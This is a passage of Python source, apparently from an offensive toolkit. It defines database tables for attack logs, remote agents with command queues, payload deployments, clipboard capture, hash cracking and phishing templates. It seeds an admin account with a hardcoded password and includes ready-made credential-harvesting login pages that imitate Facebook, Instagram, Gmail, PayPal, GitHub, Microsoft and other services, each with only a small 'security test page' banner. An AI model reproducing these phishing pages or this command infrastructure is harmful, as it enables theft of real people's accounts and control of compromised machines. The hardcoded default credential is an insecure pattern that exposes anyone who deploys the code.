                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Agents
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            # Agent commands
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            # Network packets
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            # Performance metrics
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            # Deployments
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            # Clipboard history
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            # DNS cache
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """,
            # Docker scans
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Cracking jobs
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            # NAT info
            """
            CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Platform commands
            """
            CREATE TABLE IF NOT EXISTS platform_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                command TEXT NOT NULL,
                user_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed BOOLEAN DEFAULT 0,
                result TEXT
            )
            """,
            # Email messages
            """
            CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # PDF reports
            """
            CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )
            """,
            # Threat monitors
            """
            CREATE TABLE IF NOT EXISTS threat_monitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                interval INTEGER DEFAULT 300,
                enabled BOOLEAN DEFAULT 1,
                last_scan DATETIME,
                next_scan DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Threat monitor results
            """
            CREATE TABLE IF NOT EXISTS threat_monitor_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                monitor_id INTEGER,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threats_found INTEGER DEFAULT 0,
                severity TEXT,
                output TEXT,
                FOREIGN KEY (monitor_id) REFERENCES threat_monitors(id)
            )
            """,
            # Phishing templates
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                category TEXT,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME
            )
            """,
            # Alerts
            """
            CREATE TABLE IF NOT EXISTS alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                alert_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                message TEXT NOT NULL,
                source TEXT,
                acknowledged BOOLEAN DEFAULT 0,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Settings history
            """
            CREATE TABLE IF NOT EXISTS settings_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT NOT NULL,
                old_value TEXT,
                new_value TEXT,
                changed_by TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                logger.error(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
        self._load_default_templates()
    
    def _create_default_admin(self):
        """Create default admin user"""
        try:
            import hashlib
            default_password = "snow_crab_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default admin: {e}")
    
    def _load_default_templates(self):
        """Load default phishing templates into the database"""
        templates = self._get_all_templates()
        
        for name, html in templates.items():
            try:
                self.conn.execute(
                    "INSERT OR IGNORE INTO phishing_templates (name, category, html_content, updated_at) VALUES (?, ?, ?, CURRENT_TIMESTAMP)",
                    (name, 'default', html)
                )
            except:
                pass
        self.conn.commit()
    
    def _get_all_templates(self) -> Dict[str, str]:
        """Return all 100+ phishing templates"""
        return {
            'facebook': self._template_facebook(),
            'instagram': self._template_instagram(),
            'twitter': self._template_twitter(),
            'gmail': self._template_gmail(),
            'linkedin': self._template_linkedin(),
            'microsoft': self._template_microsoft(),
            'google': self._template_google(),
            'apple': self._template_apple(),
            'paypal': self._template_paypal(),
            'amazon': self._template_amazon(),
            'netflix': self._template_netflix(),
            'spotify': self._template_spotify(),
            'whatsapp': self._template_whatsapp(),
            'telegram': self._template_telegram(),
            'discord': self._template_discord(),
            'github': self._template_github(),
            'slack': self._template_slack(),
            'zoom': self._template_zoom(),
            'teams': self._template_teams(),
            'dropbox': self._template_dropbox(),
            'adobe': self._template_adobe(),
            'steam': self._template_steam(),
            'roblox': self._template_roblox(),
            'twitch': self._template_twitch(),
            'xbox': self._template_xbox(),
            'playstation': self._template_playstation(),
            'cashapp': self._template_cashapp(),
            'venmo': self._template_venmo(),
            'chase': self._template_chase(),
            'wellsfargo': self._template_wellsfargo(),
            'office365': self._template_office365(),
            'onedrive': self._template_onedrive(),
            'icloud': self._template_icloud(),
            'pinterest': self._template_pinterest(),
            'reddit': self._template_reddit(),
            'snapchat': self._template_snapchat(),
            'tiktok': self._template_tiktok(),
            'tinder': self._template_tinder(),
            'bumble': self._template_bumble(),
            'custom': self._template_custom()
        }
    
    def _template_facebook(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center;margin-bottom:20px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}
input:focus{outline:none;border-color:#1877f2}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
button:hover{background:#166fe5}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">facebook</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_instagram(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center;margin-bottom:20px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box}
input:focus{outline:none;border-color:#0095f6}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Instagram</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_twitter(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea;margin:0}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center;margin-bottom:20px}
h2{text-align:center;margin-bottom:20px}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea;box-sizing:border-box}
input:focus{outline:none;border-color:#1d9bf0}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">𝕏</div><h2>Sign in to X</h2>
<form method="POST"><input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_gmail(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#1a73e8}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Gmail</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_linkedin(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#0a66c2}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer;font-weight:bold}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">LinkedIn</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_microsoft(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:4px;padding:44px;width:440px}
.logo{color:#ff5722;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Microsoft</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_google(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Google</title>
<style>
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border:1px solid #dadce0;border-radius:8px;padding:48px;width:450px}
.logo{color:#4285f4;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#4285f4}
button{width:100%;padding:13px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Google</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_apple(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:12px;padding:40px;width:420px}
.logo{font-size:36px;text-align:center;margin-bottom:20px}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d6d6d6;border-radius:8px;box-sizing:border-box}
input:focus{outline:none;border-color:#0071e3}
button{width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo"> Apple ID</div>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_paypal(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>
body{background:#f7f7f7;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#003087;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#0070ba}
button{width:100%;padding:12px;background:#0070ba;color:white;border:none;border-radius:20px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">PayPal</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_amazon(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>
body{background:#e3e6e6;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:32px;width:378px}
.logo{color:#f90;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#e77600}
button{width:100%;padding:10px;background:#f0c14b;color:#111;border:1px solid #a88734;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fdf5e6;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Amazon</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_netflix(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Netflix</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#141414;border-radius:8px;padding:40px;width:400px}
.logo{color:#e50914;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#333;border:1px solid #555;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#e50914}
button{width:100%;padding:12px;background:#e50914;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">NETFLIX</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_spotify(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Spotify</title>
<style>
body{background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#181818;border-radius:8px;padding:40px;width:400px}
.logo{color:#1ed760;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#282828;border:1px solid #404040;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#1ed760}
button{width:100%;padding:12px;background:#1ed760;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Spotify</div>
<form method="POST"><input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_whatsapp(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>WhatsApp</title>
<style>
body{background:#111b21;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#202c33;border-radius:8px;padding:40px;width:400px}
.logo{color:#25d366;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2a3942;border:1px solid #3b4a54;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#25d366}
button{width:100%;padding:12px;background:#25d366;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">WhatsApp</div>
<form method="POST"><input type="text" name="email" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_telegram(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Telegram</title>
<style>
body{background:#17212b;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#232e3c;border-radius:8px;padding:40px;width:400px}
.logo{color:#2aabee;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2b3a4a;border:1px solid #3a4a5a;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#2aabee}
button{width:100%;padding:12px;background:#2aabee;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Telegram</div>
<form method="POST"><input type="text" name="email" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_discord(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Discord</title>
<style>
body{background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#2f3136;border-radius:8px;padding:40px;width:400px}
.logo{color:#5865f2;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#40444b;border:1px solid #202225;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#5865f2}
button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Discord</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_github(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>
body{background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#f0f6fc}
.login-box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:32px;width:340px}
.logo{font-size:40px;text-align:center;margin-bottom:20px}
h2{text-align:center;margin-bottom:20px}
input{width:100%;padding:8px;margin:8px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#f0f6fc;box-sizing:border-box}
input:focus{outline:none;border-color:#58a6ff}
button{width:100%;padding:10px;background:#238636;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:bold}
.warning{margin-top:16px;padding:10px;background:#1c2333;border:1px solid #30363d;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">GitHub</div><h2>Sign in to GitHub</h2>
<form method="POST"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_slack(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Slack</title>
<style>
body{background:#1a1d21;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#222529;border-radius:8px;padding:40px;width:400px}
.logo{color:#611f69;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2c2d30;border:1px solid #3a3a3a;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#611f69}
button{width:100%;padding:12px;background:#611f69;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Slack</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_zoom(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Zoom</title>
<style>
body{background:#f0f5fa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#2d8cff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#2d8cff}
button{width:100%;padding:12px;background:#2d8cff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Zoom</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_teams(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Microsoft Teams</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#5059e8;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#5059e8}
button{width:100%;padding:12px;background:#5059e8;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Teams</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_dropbox(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Dropbox</title>
<style>
body{background:#f7f9fc;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0061ff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#0061ff}
button{width:100%;padding:12px;background:#0061ff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Dropbox</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_adobe(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Adobe</title>
<style>
body{background:#1a1a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#252525;border-radius:8px;padding:40px;width:400px}
.logo{color:#ff0000;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#333;border:1px solid #444;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#ff0000}
